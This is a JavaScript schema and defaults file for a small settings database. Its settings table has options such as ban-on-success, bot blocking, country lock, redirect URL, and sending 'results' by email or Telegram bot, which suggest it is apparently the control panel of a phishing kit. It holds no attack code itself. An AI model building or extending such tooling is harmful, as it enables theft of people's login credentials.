exports.configSchema = {
    config: {
        tableName: 'config',
        fields: {
            key: "TEXT PRIMARY KEY",
            value: "TEXT",
            type: "TEXT",
            tab: "TEXT",
            label: "TEXT",
            description: "TEXT",
            created_at: "DATETIME",
            updated_at: "DATETIME"
        }
    },
    layout_positions: {
        tableName: 'layout_positions',
        fields: {
            key: "TEXT PRIMARY KEY",
            x: "REAL",
            y: "REAL",
            width: "REAL",
            height: "REAL",
            created_at: "DATETIME",
            updated_at: "DATETIME"
        }
    },
    schema_version: {
        tableName: 'schema_version',
        fields: {
            "version": "TEXT PRIMARY KEY",
            "applied_at": "DATETIME"
        }
    },
    settings: {
        tableName: 'settings',
        fields: {
            "id": "INTEGER PRIMARY KEY AUTOINCREMENT",
            "autoLogin": "BOOLEAN",
            "dualLogin": "BOOLEAN",
            "dualEmailAccess": "BOOLEAN",
            "banOnSuccess": "BOOLEAN",
            "botBlockNotifications": "BOOLEAN",
            "botInfoReports": "BOOLEAN",
            "blockPC": "BOOLEAN",
            "blockMobile": "BOOLEAN",
            "redirectUrl": "TEXT",
            "countryLock": "BOOLEAN",
            "emailResults": "BOOLEAN",
            "email": "TEXT NOT NULL UNIQUE",
            "telegramResults": "TEXT",
            "telegramBotAPI": "TEXT",
            "telegramChatId": "TEXT",
            "created_at": "DATETIME",
            "updated_at": "DATETIME"
        }
    },
    tabs: {
        tableName: 'tabs',
        fields: {
            key: "TEXT PRIMARY KEY",
            tabId: "TEXT",
            label: "TEXT",
            icon: "TEXT",
            order: "INTEGER",
        }
    }
}

exports.initSettings = {
    autoLogin: false,
    dualLogin: false,
    dualEmailAccess: false,
    banOnSuccess: false,
    botBlockNotifications: false,
    botInfoReports: false,
    blockPC: false,
    blockMobile: false,
    redirectUrl: '',
    countryLock: false,
    emailResults: false,
    email: 'example@gmail.com',
    telegramBotAPI: '',
    telegramChatId: '',
    created_at: Date.now(),
    updated_at: Date.now(),
}

exports.initTabs = [
    { tabId: "Features", label: 'Features', icon: "fa fa-star", order: 1 },
    { tabId: "Page", label: 'Page', icon: "fa fa-file-alt", order: 2 },
    { tabId: "Notifications", label: 'Notifications', icon: "fa fa-bell", order: 3 },
    { tabId: "Integrations", label: 'Integrations', icon: "fa fa-plug", order: 4 },
    { tabId: "Developer", label: 'Developer', icon: "fa fa-code", order: 5 },
]